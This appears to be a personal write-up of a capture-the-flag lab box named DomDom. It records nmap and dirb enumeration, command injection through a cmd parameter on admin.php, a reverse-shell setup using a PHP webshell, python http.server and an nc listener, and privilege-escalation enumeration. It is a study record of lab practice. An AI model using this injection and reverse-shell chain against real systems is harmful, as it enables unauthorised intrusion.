

---

**S1REN's Template Reference**

\[OS]: Ubuntu
\[Web-Technology]:  http://192.168.100.7:80
\[Hostname]:  
\[IP]:  192.168.100.7
\[USERS]:   
\[CREDENTIALS]:  

---
\[To-Try LIST]:  

User form - inputs sanitised

Fuzzing


---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: DomDom
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:8F:4A:D5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16


--- 

\[Web Services Enumeration]:   


80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: DomDom
|_http-server-header: Apache/2.4.18 (Ubuntu)

|     Path: http://192.168.100.7:80/
|     Form id: user_form
|_    Form action: index.php
| http-enum: 
|_  /admin.php: Possible admin folder

Nothing at 

Dirb:
/server-status
/admin.php


SQLi - no results
Fuzzing no results
Brute forcing?
Code Eval/Injection - ACE?

Burpsuite
![[Pasted image 20250829104104.png]]

forward admin.php -> command executed
![[Pasted image 20250829104511.png]]

try execute id `name=admin&username=admin&password=admin&access=access&cmd=id`
![[Pasted image 20250829104706.png]]


code was executed. Now run reverse shell (w/ machine IP) nc and host it on webserver


```
cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 9999
nc -nlvp 1234 
```

![[Pasted image 20250829105936.png]]
![[Pasted image 20250829110029.png]]
![[Pasted image 20250829110044.png]]



---


\[OTHER / PRIVILEGE-ESCALATION]:   
S1ren get that tty
www-data
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
export TERM=xterm-256color  
alias ll='ls -lsaht --color=auto'  
stty raw -echo ; fg ; reset  
stty columns 200 rows 20

cd home

# Saw domdom user here 
cd domdom

# but no perms for reading /Desktop/Readme

which gcc #and cc, wget all positive

file /bin/bash
uname -a #Ubuntu 16.04 LTS


sudo -l #no luck needs passwd
groups #www-data, sudo
env # PATH has /tmp - if privileged binary runs without path then malicious could be planted her

#SUID/SGID
find / -perm -u=s -type f 2>/dev/null # pkexec, fusermount, mount/umount/fstab??
find / -perm -g=s -type f 2>/dev/null # crontab, mlocate, ssh-agent




```


--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
